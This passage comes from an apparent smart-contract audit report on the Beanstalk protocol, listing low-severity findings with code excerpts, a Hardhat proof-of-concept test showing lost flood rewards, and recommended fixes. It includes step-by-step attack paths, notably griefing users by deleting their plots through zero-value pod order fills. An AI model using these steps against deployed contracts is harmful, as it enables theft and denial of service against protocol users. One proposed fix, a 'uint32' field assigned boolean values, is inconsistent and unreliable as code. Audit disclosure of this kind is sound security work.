            L2Beanstalk, abi.encodeCall(IBeanL1RecieverFacet(L2Beanstalk).recieveL1Beans, (reciever, amount)), gasLimit
        );
    }
}
```

```solidity 
contract BeanL1RecieverFacet is ReentrancyGuard {
    uint256 constant EXTERNAL_L1_BEANS = 0;

>>> address constant BRIDGE = address(0x4200000000000000000000000000000000000007);
    address constant L1BEANSTALK = address(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);

    /**
     * @notice migrates `amount` of Beans to L2,
     * issued to `reciever`.
     */
    function recieveL1Beans(address reciever, uint256 amount) external nonReentrant {
        // verify msg.sender is the cross-chain messenger address, and
        // the xDomainMessageSender is the L1 Beanstalk contract.
 >>>    require(msg.sender == address(BRIDGE) && IL2Messenger(BRIDGE).xDomainMessageSender() == L1BEANSTALK);
        s.sys.migration.migratedL1Beans += amount;
        require(EXTERNAL_L1_BEANS >= s.sys.migration.migratedL1Beans, "L2Migration: exceeds maximum migrated");
        C.bean().mint(reciever, amount);
    }
}
```

## Impact
The impact of this vulnerability is significant as it prevents the migration of Beans from L1 to L2.

## Tools Used
Manual code review

## Recommendations
Ensure that the `BRIDGE` address constant is the same in both `BeanL1RecieverFacet` and `BeanL2MigrationFacet` contracts to allow successful communication between them.
## <a id='L-18'></a>L-18. Mowing between two consecutive floods results in loss of rewards related to the second flood

_Submitted by [fyamf](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

If a user mows between two consecutive floods and then mows again after the season of the second flood, they will not receive SoP rewards related to the second flood. They will only receive SoP rewards related to the first flood.

However, if the user does not mow between the two consecutive floods, and only mows after the season of the second flood, they will gain SoP rewards related to both floods.

## Vulnerability Details

If it rains in a season and the conditions `P > 1 and pod rate < 5%` are met, there will be a flood in the next season. If these conditions are still met in the following season, there will be another flood, resulting in two consecutive floods.

When multiple consecutive floods occur, Beanstalk will consider them as a single flood event (i.e., a flood that lasts for multiple seasons).

The issue is that:

Suppose there is a flood in a season, and a user mows in that season. The user will receive the SoP rewards related to this flood. If there is another flood in the next season (resulting in consecutive floods) and the user mows in that season, the user will not receive the SoP rewards related to the second flood.

This issue arises because, in the function `_mow`, it checks whether the last update is less than or equal to the rain start season.

If the user has mowed between two consecutive floods, the last update occurs after the rain start season. Consequently, when mowing after the second flood, this check fails, preventing the `handleRainAndSops` function from being called again, and the user does not receive SoP rewards related to the second flood.

```solidity
    function _mow(address account, address token) external {
        //.......
        uint32 currentSeason = s.sys.season.current;
        if (s.sys.season.rainStart > s.sys.season.stemStartSeason) {
            if (lastUpdate <= s.sys.season.rainStart && lastUpdate <= currentSeason) {
                // Increments `plenty` for `account` if a Flood has occured.
                // Saves Rain Roots for `account` if it is Raining.
                LibFlood.handleRainAndSops(account, lastUpdate);
            }
        }
        //......
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L435>

Note that an attacker can do a malicious act due to this vulnerability:

An attacker notices that there is going to be a second flood, then he calls the function `mow` for the account of a victim in the season of first flood. This lets the victim get rewards for the first flood. But when the second flood comes and the victim mows again, they get no rewards. This way, the attacker stops the victim from getting rewards for the second flood.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/SiloFacet/ClaimFacet.sol#L116>

### Test cases

In the following test case, there are two tests done:

* first: mowing between two consecutive floods, loses the rewards in the second flood (user mows between seasons 8 and 9, then mows and claims plenty in season 9)
* second: mowing after two consecutive floods, gain the rewards of both floods (user does not mow between seasons 8 and 9, only mows and claims plenty in season 9)

#### first: mowing between two consecutive floods, loses the rewards in the second flood

In this test the user deposits in season 5 and mows in season 6. So, the user's roots will be nonzero. Then in season 7, it starts raining. Then, there is a flood in season 8. In this season, the user mows. So, the function `LibFlood.handleRainAndSops(account, lastUpdate)` would be called, where the SoP rewards of flood in season 8 are allocated to the user.

Then, the reserves are changed to have positive `deltaB` in the next season, resulting in having SoP rewards in the next season again. This step is just to simulate a situation that still the conditions `P > 1 and pod rate < %5` are met after the flood in season 8, so there will be another flood in season 9. Then, in season 9, the user mows. This time, the function `LibFlood.handleRainAndSops(account, lastUpdate)` will not be called, because the last update season of the user is 8, while the rain start season is 7.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L435>

Calling `balanceOfPlenty` shows that the user is allocated `102382303659393812034` sop token, but when the function `claimPlenty` is called, the user only receives `51191151829696906017` sop token. The received amount is equal to the SoP rewards related to the first flood (in season 8), and the SoP rewards in season 9 is not allocated to the user.

#### second: mowing after two consecutive floods, gain the rewards of both floods

In the following test the user deposits in season 5 and mows in season 6. So, the user's roots will be nonzero. Then in season 7, it starts raining. Then, there is a flood in season 8.

Then, the reserves are changed to have positive `deltaB` in the next season, resulting in having SoP rewards in the next season again. This step is just to simulate a situation that still the conditions `P > 1 and pod rate < %5` are met after the flood in season 8, so there will be another flood in season 9. Then, in season 9, the user mows. So, the function `LibFlood.handleRainAndSops(account, lastUpdate)` will be called, because the last update season of the user is 6, while the rain start season is 7.
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L435>

Calling `balanceOfPlenty` shows that the user is allocated `102382303659393812034` sop token, and when the function `claimPlenty` is called, the user receives `102382303659393812034` sop token. The received amount is equal to the SoP rewards related to sum of both floods (in season 8 and 9).

```javascript
const { expect } = require("chai");
const { deploy } = require("../scripts/deploy.js");
const { EXTERNAL, INTERNAL, INTERNAL_EXTERNAL, INTERNAL_TOLERANT } = require("./utils/balances.js");
const {
  BEAN,
  BEAN_ETH_WELL,
  WETH,
  MAX_UINT256,
  ZERO_ADDRESS,
  BEAN_WSTETH_WELL,
  WSTETH
} = require("./utils/constants.js");
const { to18, to6, advanceTime } = require("./utils/helpers.js");
const { deployMockWell, whitelistWell, deployMockWellWithMockPump } = require("../utils/well.js");
const { takeSnapshot, revertToSnapshot } = require("./utils/snapshot.js");
const {
  setStethEthChainlinkPrice,
  setWstethEthUniswapPrice,
  setEthUsdChainlinkPrice
} = require("../utils/oracle.js");
const { getAllBeanstalkContracts } = require("../utils/contracts.js");

let user, user2, owner;

describe("Sop Test Cases", function () {
  before(async function () {
    [owner, user, user2] = await ethers.getSigners();

    const contracts = await deploy((verbose = false), (mock = true), (reset = true));
    ownerAddress = contracts.account;
    this.diamond = contracts.beanstalkDiamond;

    // `beanstalk` contains all functions that the regualar beanstalk has.
    // `mockBeanstalk` has functions that are only available in the mockFacets.
    [beanstalk, mockBeanstalk] = await getAllBeanstalkContracts(this.diamond.address);

    bean = await ethers.getContractAt("Bean", BEAN);
    this.weth = await ethers.getContractAt("MockToken", WETH);

    mockBeanstalk.deployStemsUpgrade();

    await mockBeanstalk.siloSunrise(0);

    await bean.connect(user).approve(beanstalk.address, "100000000000");
    await bean.connect(user2).approve(beanstalk.address, "100000000000");
    await bean.mint(user.address, to6("10000"));
    await bean.mint(user2.address, to6("10000"));

    // init wells
    [this.well, this.wellFunction, this.pump] = await deployMockWellWithMockPump();
    await deployMockWellWithMockPump(BEAN_WSTETH_WELL, WSTETH);
    await this.well.connect(owner).approve(this.diamond.address, to18("100000000"));
    await this.well.connect(user).approve(this.diamond.address, to18("100000000"));

    // set reserves at a 1000:1 ratio.
    await this.pump.setCumulativeReserves(this.well.address, [to6("1000000"), to18("1000")]);
    await this.well.mint(ownerAddress, to18("500"));
    await this.well.mint(user.address, to18("500"));
    await mockBeanstalk.siloSunrise(0);
    await mockBeanstalk.captureWellE(this.well.address);

    await setEthUsdChainlinkPrice("1000");
    await setStethEthChainlinkPrice("1000");
    await setStethEthChainlinkPrice("1");
    await setWstethEthUniswapPrice("1");

    await this.well.setReserves([to6("1000000"), to18("1100")]);
    await this.pump.setInstantaneousReserves(this.well.address, [to6("1000000"), to18("1100")]);

    await mockBeanstalk.siloSunrise(0); // 3 -> 4
    await mockBeanstalk.siloSunrise(0); // 4 -> 5

  });

  beforeEach(async function () {
    snapshotId = await takeSnapshot();
  });

  afterEach(async function () {
    await revertToSnapshot(snapshotId);
  });

  describe("consecutive floods scenarios", async function () {

    it("mowing between two consecutive floods, loses the rewards in the second flood", async function () {
      console.log("current season: ", await beanstalk.season()); // 5

      await beanstalk.connect(user).deposit(bean.address, to6("1000"), EXTERNAL);

      await mockBeanstalk.siloSunrise(0); // 5 => 6

      await beanstalk.mow(user.address, bean.address);

      // rain starts in season 7
      await mockBeanstalk.rainSunrise(); // 6 => 7

      const rain = await beanstalk.rain();
      let season = await beanstalk.time();
      console.log("season.rainStart: ", season.rainStart);
      console.log("season.raining: ", season.raining);
      console.log("rain.roots: ", rain.roots);

      // there is a flood in season 8
      await mockBeanstalk.rainSunrise(); // 7 => 8

      await beanstalk.mow(user.address, bean.address);

      // Changing the reserves to have SoP rewards in the next season, otherwise deltaB would be zero
      // This is just to simulate a situation  when after the flood in season 8, still the condition of 
      // P > 1 and pod rate < %5 are met, leading to another flood in the next season
      await this.well.setReserves([to6("1000000"), to18("1100")]);
      await this.pump.setInstantaneousReserves(this.well.address, [to6("1000000"), to18("1100")]);

      // there is a flood in season 9
      await mockBeanstalk.rainSunrise(); // 8 => 9

      await beanstalk.mow(user.address, bean.address);

      const balanceOfPlenty = await beanstalk.connect(user).balanceOfPlenty(user.address, this.well.address);

      console.log("user's balanceOfPlenty: ", balanceOfPlenty);

      await beanstalk.connect(user).claimPlenty(this.well.address, EXTERNAL);
      console.log("balance: ", await this.weth.balanceOf(user.address));

      expect(await this.weth.balanceOf(user.address)).to.be.equal(balanceOfPlenty);
    });

  });

  it("mowing after two consecutive floods, gain the rewards of both floods", async function () {
    console.log("current season: ", await beanstalk.season()); // 5

    await beanstalk.connect(user).deposit(bean.address, to6("1000"), EXTERNAL);

    await mockBeanstalk.siloSunrise(0); // 5 => 6

    await beanstalk.mow(user.address, bean.address);

    // rain starts in season 7
    await mockBeanstalk.rainSunrise(); // 6 => 7

    const rain = await beanstalk.rain();
    let season = await beanstalk.time();
    console.log("season.rainStart: ", season.rainStart);
    console.log("season.raining: ", season.raining);
    console.log("rain.roots: ", rain.roots);

    // there is a flood in season 8
    await mockBeanstalk.rainSunrise(); // 7 => 8

    // Changing the reserves to have SoP rewards in the next season, otherwise deltaB would be zero
    // This is just to simulate a situation  when after the flood in season 8, still the condition of 
    // P > 1 and pod rate < %5 are met, leading to another flood in the next season
    await this.well.setReserves([to6("1000000"), to18("1100")]);
    await this.pump.setInstantaneousReserves(this.well.address, [to6("1000000"), to18("1100")]);

    // there is a flood in season 9
    await mockBeanstalk.rainSunrise(); // 8 => 9

    await beanstalk.mow(user.address, bean.address);

    const balanceOfPlenty = await beanstalk.connect(user).balanceOfPlenty(user.address, this.well.address);

    console.log("user's balanceOfPlenty: ", balanceOfPlenty);

    await beanstalk.connect(user).claimPlenty(this.well.address, EXTERNAL);
    console.log("balance: ", await this.weth.balanceOf(user.address));

    expect(await this.weth.balanceOf(user.address)).to.be.equal(balanceOfPlenty);
  });


})

```

The output result of tests are:

```Solidity
current season:  5
season.rainStart:  7
season.raining:  true
rain.roots:  BigNumber { value: "2000000000000000000000" }
user's balanceOfPlenty:  BigNumber { value: "102382303659393812034" }
balance:  BigNumber { value: "102382303659393812034" }
    ✔ mowing after two consecutive floods, gain the rewards of both floods (108ms)
    consecutive floods scenarios
current season:  5
season.rainStart:  7
season.raining:  true
rain.roots:  BigNumber { value: "2000000000000000000000" }
user's balanceOfPlenty:  BigNumber { value: "102382303659393812034" }
balance:  BigNumber { value: "51191151829696906017" }
      1) mowing between two consecutive floods, loses the rewards in the second flood


  1 passing (9s)
  1 failing

  1) Sop Test Cases
       consecutive floods scenarios
         mowing between two consecutive floods, loses the rewards in the second flood:

      AssertionError: Expected "51191151829696906017" to be equal 102382303659393812034
      + expected - actual

       {
      -  "_hex": "0x058cd702bbc8580642"
      +  "_hex": "0x02c66b815de42c0321"
         "_isBigNumber": true
       }
```

## Impact

Loss of SoP rewards, if the user (or the attacker maliciously) mows between two consecutive floods.

## Tools Used

## Recommendations

One possible solution is to track the consecutive floods. If it is happening, then during the mowing, the last update season should be compared with the previous SoP season, not the the rain start season. In other words, it should be viewed as if the rain start season of the second flood is equal to the first flood season.

The modifications are as follows:

* Adding a new storage variable `bool consecutiveFloods;` to the end of the struct `System` in the contract `System.sol`.

```solidity
struct System {
   bool paused;
   uint128 pausedAt;
   uint256 reentrantStatus;
   uint256 isFarm;
   address ownerCandidate;
   uint256 plenty;
   uint128 soil;
   uint128 beanSown;
   uint256 activeField;
   uint256 fieldCount;
   bytes32[16] _buffer_0;
   mapping(uint256 => mapping(uint256 => bytes32)) podListings;
   mapping(bytes32 => uint256) podOrders;
   mapping(IERC20 => uint256) internalTokenBalanceTotal;
   mapping(address => bytes) wellOracleSnapshots;
   mapping(address => TwaReserves) twaReserves;
   mapping(address => uint256) usdTokenPrice;
   mapping(uint32 => uint256) sops;
   mapping(uint256 => Field) fields;
   mapping(uint256 => ConvertCapacity) convertCapacity;
   ShipmentRoute[] shipmentRoutes;
   bytes32[16] _buffer_1;
   bytes32[144] casesV2;
   Silo silo;
   Field field;
   Fertilizer fert;
   Season season;
   Weather weather;
   SeedGauge seedGauge;
   Rain rain;
   Migration migration;
   bytes32[128] _buffer_2;
   mapping(address => Implementation) oracleImplementation;
   SeedGaugeSettings seedGaugeSettings;
   SeasonOfPlenty sop;

   ////////////// new storage variable
   uint32 consecutiveFloods.
}
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/storage/System.sol#L42>

* Changing the function `rewardSop` as follows to track the consecutive floods.

```solidity
    function rewardSop(address well, uint256 amount, address sopToken) private {
       AppStorage storage s = LibAppStorage.diamondStorage();
       s.sys.sop.sops[s.sys.season.rainStart][well] = s
       .sys
       .sop
       .sops[s.sys.season.lastSop][well].add(amount.mul(C.SOP_PRECISION).div(s.sys.rain.roots));

       //////////////// tracking the consecutive floods
       if(s.sys.season.lastSopSeason == s.sys.season.current - 1){
           s.sys.consecutiveFloods = true;
       } else {
           s.sys.consecutiveFloods = false;
       }
       //////////////////////

       s.sys.season.lastSop = s.sys.season.rainStart;
       s.sys.season.lastSopSeason = s.sys.season.current;

       // update Beanstalk's stored overall plenty for this well
       s.sys.sop.plentyPerSopToken[sopToken] += amount;
   }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L320>

* Changing the function `handleRain` as follows to reset the consecutive floods in case the rain is stopped.

```solidity
   function handleRain(uint256 caseId) external {
       AppStorage storage s = LibAppStorage.diamondStorage();
       // cases % 36  3-8 represent the case where the pod rate is less than 5% and P > 1.
       if (caseId.mod(36) < 3 || caseId.mod(36) > 8) {
           if (s.sys.season.raining) {
               s.sys.season.raining = false;
           }

           /////////////////////// reset the consecutive floods
           if(s.sys.consecutiveFloods){
               s.sys.consecutiveFloods = false;
           }
           //////////////////////////

           return;
       } else if (!s.sys.season.raining) {
           s.sys.season.raining = true;
           address[] memory wells = LibWhitelistedTokens.getCurrentlySoppableWellLpTokens();
           // Set the plenty per root equal to previous rain start.
           uint32 season = s.sys.season.current;
           uint32 rainstartSeason = s.sys.season.rainStart;
           for (uint i; i < wells.length; i++) {
               s.sys.sop.sops[season][wells[i]] = s.sys.sop.sops[rainstartSeason][wells[i]];
           }
           s.sys.season.rainStart = s.sys.season.current;
           s.sys.rain.pods = s.sys.fields[s.sys.activeField].pods;
           s.sys.rain.roots = s.sys.silo.roots;
       } else {
           // flood podline first, because it checks current Bean supply
           floodPodline();

           if (s.sys.rain.roots > 0) {
               (
                   WellDeltaB[] memory wellDeltaBs,
                   uint256 totalPositiveDeltaB,
                   uint256 totalNegativeDeltaB,
                   uint256 positiveDeltaBCount
               ) = getWellsByDeltaB();
               wellDeltaBs = calculateSopPerWell(
                   wellDeltaBs,
                   totalPositiveDeltaB,
                   totalNegativeDeltaB,
                   positiveDeltaBCount
               );

               for (uint i; i < wellDeltaBs.length; i++) {
                   sopWell(wellDeltaBs[i]);
               }
           }
       }
   }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibFlood.sol#L55>

* Chaning the function `_mow` as follows to compare the last update season with the rain start season affected by consecutive floods.

```solidity
    function _mow(address account, address token) external {
       AppStorage storage s = LibAppStorage.diamondStorage();

       // if the user has not migrated from siloV2, revert.
       uint32 lastUpdate = _lastUpdate(account);

       // sop data only needs to be updated once per season,
       // if it started raining and it's still raining, or there was a sop
       uint32 currentSeason = s.sys.season.current;

       ///////// new variable is defined.
       uint32 rainStart;
       ///////////////

       if (s.sys.season.rainStart > s.sys.season.stemStartSeason) {

           ///////// since consecutive floods has happened, the rain start season refers to last SoP season instead of initial rain start season
           if(s.sys.consecutiveFloods){
               rainStart = s.sys.season.lastSopSeason;
           } else {
               rainStart = s.sys.season.rainStart;
           }
           ///////////////////////

           ////////// compare the lastUpdate with rainStart, instead of s.sys.season.rainStart
           if (lastUpdate <= rainStart && lastUpdate <= currentSeason) {
               // Increments `plenty` for `account` if a Flood has occured.
               // Saves Rain Roots for `account` if it is Raining.
               LibFlood.handleRainAndSops(account, lastUpdate);
           }
       }

       // End account germination.
       if (lastUpdate < currentSeason) {
           LibGerminate.endAccountGermination(account, lastUpdate, currentSeason);
       }
       // Calculate the amount of Grown Stalk claimable by `account`.
       // Increase the account's balance of Stalk and Roots.
       __mow(account, token);

       // update lastUpdate for sop and germination calculations.
       s.accts[account].lastUpdate = currentSeason;
   }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibSilo.sol#L425>

## <a id='L-19'></a>L-19. Malicious users can delete plots from other users in a specific edge case

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Malicious users can delete plots from other users in a specific edge case

## Vulnerability Details
Let's look at the code of `_transferPlot`
```solidity
    function _transferPlot(
        address from,
        address to,
        uint256 fieldId,
        uint256 index,
        uint256 start,
        uint256 amount
    ) internal {
        require(from != to, "Field: Cannot transfer Pods to oneself.");
        insertPlot(to, fieldId, index + start, amount);
        removePlot(from, fieldId, index, start, amount + start);
        emit PlotTransfer(from, to, index + start, amount);
    }

    function insertPlot(address account, uint256 fieldId, uint256 index, uint256 amount) internal {
        s.accts[account].fields[fieldId].plots[index] = amount;
        s.accts[account].fields[fieldId].plotIndexes.push(index);
    }
```

As we can see, the way transfer works, is that the receiver's `index + start` slot is overwritten to its new value. This could be problematic, if a user manages to invoke a transfer for an index which the receiver already has.

Though, since two users cannot possibly have plots on the same index, the only way this could be executed is through a 0-value transfer.

```solidity
    function _fillPodOrder(
        PodOrder calldata o,
        uint256 index,
        uint256 start,
        uint256 amount,
        LibTransfer.To mode
    ) internal {

        require(amount >= o.minFillAmount, "Marketplace: Fill must be >= minimum amount.");
        require(s.a[msg.sender].field.plots[index] >= (start.add(amount)), "Marketplace: Invalid Plot.");
        require(index.add(start).add(amount).sub(s.f.harvestable) <= o.maxPlaceInLine, "Marketplace: Plot too far in line.");
        
        bytes32 id = createOrderId(o.account, o.pricePerPod, o.maxPlaceInLine, o.minFillAmount);
        uint256 costInBeans = amount.mul(o.pricePerPod).div(1000000);
        s.podOrders[id] = s.podOrders[id].sub(costInBeans, "Marketplace: Not enough beans in order.");

        LibTransfer.sendToken(C.bean(), costInBeans, msg.sender, mode);
        
        if (s.podListings[index] != bytes32(0)) _cancelPodListing(msg.sender, index);
        
        _transferPlot(msg.sender, o.account, index, start, amount);

        if (s.podOrders[id] == 0) delete s.podOrders[id];
        
        emit PodOrderFilled(msg.sender, o.account, id, index, start, amount, costInBeans);
    }
```

As we can see, the only restriction `_fillPodOrder` has is that the filled amount is at least the `minFillAmount`. Meaning that if `minFillAmount == 0`, a 0-value fill amount will succeed.

Here's how an attacker can utilize the system:
1. Attacker get some plots
2. Attacker creates a `podOrder` from another wallet with `minFillAmount == 0`.
3. Attacker fills the `podOrder` with 0. This will add the needed index to the new wallet's `plotIndexes`
4. Attacker creates a listing for their plots
5. Victim fills the listing and buys attacker's plots.
6. Now if victim has/creates a `podOrder` with `minFillAmount == 0`, the attacker can fill it with 0 and override the just bought plots, deleting them.

## Impact
Loss of plots 

## Tools Used
Manual review

## Recommendations
Never allow 0-value plot transfers

## <a id='L-20'></a>L-20. If token get's unwhitelisted, users will be unable to claim the `plenty` they've accrued prior to the unwhitelist

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Users might lose their `plenty`

## Vulnerability Details
When users mow, if a sop season has occurred since `lastUpdate`, they're calculated their `plenty` for each of the currently whitelisted tokens.

```solidity
        // If a Sop has occured since last update, calculate rewards and set last Sop.
        if (s.sys.season.lastSopSeason > lastUpdate) {
            address[] memory tokens = LibWhitelistedTokens.getWhitelistedWellLpTokens();
            for (uint i; i < tokens.length; i++) {
                s.accts[account].sop.perWellPlenty[tokens[i]].plenty = balanceOfPlenty(
                    account,
                    tokens[i]
                );
            }
            s.accts[account].lastSop = s.sys.season.lastSop;
        }
```

This could be problematic as if the user has had previous uncalculated plenty for a token that's now unwhitelisted, they won't be able to claim for it.

## Impact
Loss of funds

## Tools Used
Manual review

## Recommendations
Fix is non-trivial
## <a id='L-21'></a>L-21. Hardcoded `MERKLE_ROOT` will make the contract unusable

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Hardcoded `MERKLE_ROOT` will make the contract unusable

## Vulnerability Details
Currently, the merkle root in `L2ContractMigrationFacet` is hardcoded and cannot be changed 

```solidity
    bytes32 private constant MERKLE_ROOT =
        0xa84dc86252c556839dff46b290f0c401088a65584aa38a163b6b3f7dd7a5b0e8;
```

When this contract gets deployed, it will be unusable as it cannot be changed.


## Impact
DoS

## Tools Used
Manual review

## Recommendations
Change it to immutable and only set it in the constructor, using admin's input
## <a id='L-22'></a>L-22. `plenty` balances are not migrated on L2 

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`plenty` balances are not migrated on L2 

## Vulnerability Details
When migration starts all of the `beanEth`, `beanwsteth` and `bean3crv` is transferred and migrated automatically. As these will be `plenty` tokens, this will make it impossible for users to claim their allocated `plenty`.

As the `plenty` amounts are also not migrated on L2, the user-accrued plenty will simply be lost.

```solidity
    function init() external {
        // Pause beanstalk, preventing future sunrises.
        s.paused = true;
        s.pausedAt = uint128(block.timestamp);
        emit Pause(block.timestamp);

        // transfer the following whitelisted silo assets to the BCM:
        // bean:eth
        IERC20 beanEth = IERC20(C.BEAN_ETH_WELL);
        uint256 beanEthBalance = beanEth.balanceOf(address(this));
        beanEth.transfer(BCM, beanEthBalance);

        // BEAN:WstETH
        IERC20 beanwsteth = IERC20(C.BEAN_WSTETH_WELL);
        uint256 beanwstethBalance = beanwsteth.balanceOf(address(this));
        beanwsteth.transfer(BCM, beanwstethBalance);

        // BEAN:3CRV
        IERC20 bean3crv = IERC20(C.CURVE_BEAN_METAPOOL);
        uint256 bean3crvBalance = bean3crv.balanceOf(address(this));
        bean3crv.transfer(BCM, bean3crvBalance);
    }
```


## Impact
Loss of funds

## Tools Used
Manual review 

## Recommendations
Migrate the plenty values on L2 and allow users to claim it
## <a id='L-23'></a>L-23. High Risk Denial-of-Service (DoS) Vulnerability in ERC1155 Token Minting Process.

_Submitted by [Uno](https://profiles.cyfrin.io/u/undefined), [Draiakoo](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Uno](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary:

This report describes a potential Denial-of-Service (DoS) vulnerability.
The vulnerability arises when [mintFertilizers ](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/init/reseed/L2/ReseedBarn.sol#L72-L96)calls [beanstalkMint](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/tokens/Fertilizer/Fertilizer.sol#L47-L60)  to mint ERC1155 NFT if receiver is contract it must implement `onERC1155Received` if that contract has no `onERC1155Received` the whole transaction will revert causing Dos and prevent other users from getting their fertilizer NFT.

## Vulnerability Details

The [mintFertilizers](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/init/reseed/L2/ReseedBarn.sol#L72-L96) function attempts to mint a specific fertilizer (fertilizerId) for multiple users.
However, the code depends on `onERC1155Received` callback being implemented by the receiving L2 contract to check `ERC1155 implementation`, if the receiver contract doesn't implement `onERC1155Received`  the transaction will revert.

1- If a receiving contract (L2) does not have the `onERC1155Received` callback implemented, the mintFertilizers function will revert due to `onERC1155Received` missing.
2- Since mintFertilizers attempts to mint NFT for multiple users, a missing `onERC1155Received` callback on L2 contracts leads to a DoS. &#x20;

3- A user with bad intentions can cause Dos and prevent NFT fertilizer from being minted, to other users.

POC:

```solidity
function mintFertilizers(Fertilizer fertilizerProxy, Fertilizers[] calldata fertilizerIds) internal {
    // ...snip
    // reissue fertilizer to each holder.
    for (uint j; j < f.accountData.length; j++) {

@>>   fertilizerProxy.beanstalkMint(
          f.accountData[j].account,
          fid,
          f.accountData[j].amount,
          f.accountData[j].lastBpf
      );
    }
    // ...snip
}

function beanstalkMint(address account, uint256 id, uint128 amount, uint128 bpf) external onlyOwner {
      // ...snip
@>>   _safeMint(account, id, amount, bytes("0"));
}

function _safeMint(address to, uint256 id, uint256 amount, bytes memory data) internal virtual {
      // ...snip
@>>   __doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);
}

function __doSafeTransferAcceptanceCheck(
    address operator,
    address from,
    address to,
    uint256 id,
    uint256 amount,
    bytes memory data
) private {
    if (LibFertilizer.isContract(to)) {
        try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) 
            returns(bytes4 response) 
        {
            if (response != IERC1155Receiver.onERC1155Received.selector) {
                revert("ERC1155: ERC1155Receiver rejected tokens");
            }
        } catch Error(string memory reason) {
            revert(reason);
        } catch {
@>>         revert("ERC1155: transfer to non ERC1155Receiver implementer");
        }
    }
}

```

## Impact:

A user with bad intentions can cause Dos and prevent NFT fertilizer from being minted, to other users.

## Tools Used

## Recommendation:

There are many ways to handle this issue, after the developers are notified with this issue they will update the code as they see it fits.

## <a id='L-24'></a>L-24. Difference with variable decoding between `AdvancedPipeCall` and `AdvancedFarmCall`

_Submitted by [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The decoding order of `copyReturnIndex`, `copyByteIndex` and `pasteByteIndex` for `AdvancedPipeCall` and `AdvancedFarmCall` is different for the tractor and for the clipboard and can lead to unexpected results

## Relevant GitHub Links:
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibBytes.sol#L155-L172
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibBytes.sol#L179-L206

## Vulnerability Details

Looking closely to the functions `pasteBytesClipboard` and `pasteBytesTractor` we can see that there is a difference when decoding the `copyReturnIndex`, `copyByteIndex` and `pasteByteIndex`.

```Solidity
    function pasteBytesClipboard(
        bytes32 returnPasteParam, // Copy/paste instructions.
        bytes[] memory copyFromDataSet, // data to copy from.
        bytes memory pasteToData // Paste destination.
    ) internal pure {
        (uint256 copyReturnIndex, uint256 copyByteIndex, uint256 pasteByteIndex) = decode(
            returnPasteParam
        );
        ...
    }
```

As we can see, the function `pasteBytesClipboard` extract these 3 indexes in the proper order accordingly to the pipeline docs.

![evmpipeline docs](https://i.ibb.co/QHSd0p1/Captura2.png)

However, in the `pasteBytesTractor`, the `copyByteIndex` and the `copyReturnIndex` are swapped. That could lead users to wrongly provide these 2 parameters swapped and get unexpected results in their advanced calls.

```Solidity
    function pasteBytesTractor(
        bytes32 operatorPasteInstr,
        bytes memory copyFromData,
        bytes memory pasteToData
    ) internal view {
        // Decode operatorPasteInstr.
        (uint80 copyByteIndex, /* copyReturnIndex */, uint80 pasteByteIndex) = decode(operatorPasteInstr);

        ...
    }
```

## Impact

Medium

## Tools Used

Manual review

## Recommendations

Decode the 3 variables in the same order as the docs and the `pasteBytesClipboard` does.

## <a id='L-25'></a>L-25. Plot allowances should have defined the index and start

_Submitted by [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Plot allowances are not completely constrained and can lead to users move pods that approvers would not like to

## Relevant GitHub Links:

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/market/MarketplaceFacet/PodTransfer.sol#L102-L109>

## Vulnerability Details

When someone buys a huge amount of pods, the ones that are closer to the harvestable counter will be more valuable than the farest ones. That is because those pods will become harvestable and exchangable for beans sooner than the others.
However, the pod allowances only determines the amount of pods that someone approved to move on his behalf. But this does not state at which start and which index, hence he can transfer much more value than the user wanted to.
In the pod marketplace, we can see that there is a protection for `fillPodOrder` for the `maxPlaceLine`.

```Solidity
    function _fillPodOrder(
        PodOrder calldata podOrder,
        address filler,
        uint256 index,
        uint256 start,
        uint256 podAmount,
        LibTransfer.To mode
    ) internal {
        ...
        require(
            (index + start + podAmount - s.sys.fields[podOrder.fieldId].harvestable) <=
                podOrder.maxPlaceInLine,
            "Marketplace: Plot too far in line."
        );
        ...
    }
```

This protection is coded because if a user creates a pod order to buy x pods, somebody could buy a large amount of pods and fill the order with the most far pods.
With this protection, the orderer can determine a limit to the pods he is willing to buy for them to not be really far from the harvestable index.
However, for the allowance to transfer pods on behalf of somebody else there is no protection for that.
Imagine that somebody want to allow an other user to move x pods thinking that these pods will be the farest ones and will have a certain value, the approved address can move the same amount of pods from the closest index to the harvestable. Essentially this would allow the approved user to move more value than the user initially wanted.
